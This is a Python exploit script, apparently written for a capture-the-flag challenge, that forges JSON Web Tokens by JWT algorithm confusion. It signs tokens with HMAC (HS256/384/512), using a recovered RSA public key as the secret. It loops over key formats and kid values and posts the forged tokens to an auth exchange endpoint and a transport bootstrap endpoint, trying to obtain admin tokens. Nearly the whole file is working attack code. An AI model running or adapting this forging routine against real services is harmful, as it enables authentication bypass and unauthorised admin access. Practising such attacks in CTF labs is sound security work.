"""
Manual JWT forging - bypass PyJWT's safety check by constructing
the JWT manually using HMAC with the public key PEM as secret.
"""
import json
import base64
import hmac
import hashlib
import requests
import time

BASE = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

with open("recovered_pubkey.pem", "rb") as f:
    pubkey_pem = f.read()

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def forge_jwt(header: dict, payload: dict, secret: bytes, alg_hash=hashlib.sha256) -> str:
    h_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret, signing_input, alg_hash).digest()
    s_b64 = b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{s_b64}"

# === Test on /api/auth/exchange ===
print("=== Testing forged tickets on /api/auth/exchange ===\n")

ticket_payload = {
    "typ": "ticket",
    "scope": "admin-bootstrap",
    "sub": "ops-root",
    "iss": "ghost-packet-auth",
    "aud": "ghost-packet-ticket",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

# Various key formats as HMAC secret
key_variants = [
    ("PEM bytes", pubkey_pem),
    ("PEM no newlines", pubkey_pem.replace(b'\n', b'')),
    ("DER (base64 decoded)", base64.b64decode(b''.join(pubkey_pem.split(b'\n')[1:-2]))),
    ("PEM string utf-8", pubkey_pem),  # same but for clarity
]

alg_configs = [
    ("HS256", hashlib.sha256),
    ("HS384", hashlib.sha384),
    ("HS512", hashlib.sha512),
]

kid_options = ["legacy-rs256-retired", "primary-rs256"]

for kid in kid_options:
    for alg_name, alg_hash in alg_configs:
        for key_label, key_bytes in key_variants:
            header = {"alg": alg_name, "typ": "JWT", "kid": kid}
            token = forge_jwt(header, ticket_payload, key_bytes, alg_hash)
            
            r = requests.post(
                f"{BASE}/api/auth/exchange",
                json={"ticket": token, "grantType": "legacy-bootstrap"},
                headers={"Content-Type": "application/json", "Accept": "application/json"}
            )
            
            txt = r.text[:300]
            if r.status_code == 200:
                print(f"*** SUCCESS *** kid={kid} alg={alg_name} key={key_label}")
                print(f"  Response: {txt}")
                data = r.json()
                if "token" in data:
                    print(f"\n  ADMIN TOKEN OBTAINED: {data['token'][:80]}...")
            elif "ALG_NOT_ALLOWED" in txt:
                pass  # Expected - server blocks HMAC algs
            elif "signature verification failed" in txt:
                pass  # Key mismatch
            else:
                print(f"  [{r.status_code}] kid={kid} alg={alg_name} key={key_label}: {txt}")

# === Also test directly on /api/transport/bootstrap ===
print("\n\n=== Testing forged access tokens on /api/transport/bootstrap ===\n")

access_payload = {
    "typ": "access",
    "role": "admin",
    "sub": "ops-root",
    "iss": "ghost-packet-auth",
    "aud": "ghost-packet-api",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "jti": "forged-admin-token"
}

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
import os

# Generate ECDH key for transport
priv_key = ec.generate_private_key(ec.SECP256R1())
pub_key = priv_key.public_key()
numbers = pub_key.public_numbers()

def int_to_b64url(val, length):
    return b64url_encode(val.to_bytes(length, 'big'))

jwk = {
    "kty": "EC",
    "crv": "P-256",
    "x": int_to_b64url(numbers.x, 32),
    "y": int_to_b64url(numbers.y, 32),
    "ext": True
}

for kid in kid_options:
    for alg_name, alg_hash in alg_configs:
        for key_label, key_bytes in key_variants:
            header = {"alg": alg_name, "typ": "JWT", "kid": kid}
            token = forge_jwt(header, access_payload, key_bytes, alg_hash)
            
            r = requests.post(
                f"{BASE}/api/transport/bootstrap",
                json={"clientPublicKey": jwk},
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Authorization": f"Bearer {token}"
                }
            )
            
            txt = r.text[:300]
            if r.status_code == 200:
                print(f"*** SUCCESS *** kid={kid} alg={alg_name} key={key_label}")
                print(f"  Response: {txt}")
            elif "ALG_NOT_ALLOWED" in txt:
                pass
            elif "signature verification failed" in txt:
                pass
            else:
                print(f"  [{r.status_code}] kid={kid} alg={alg_name} key={key_label}: {txt}")

print("\nDone.")
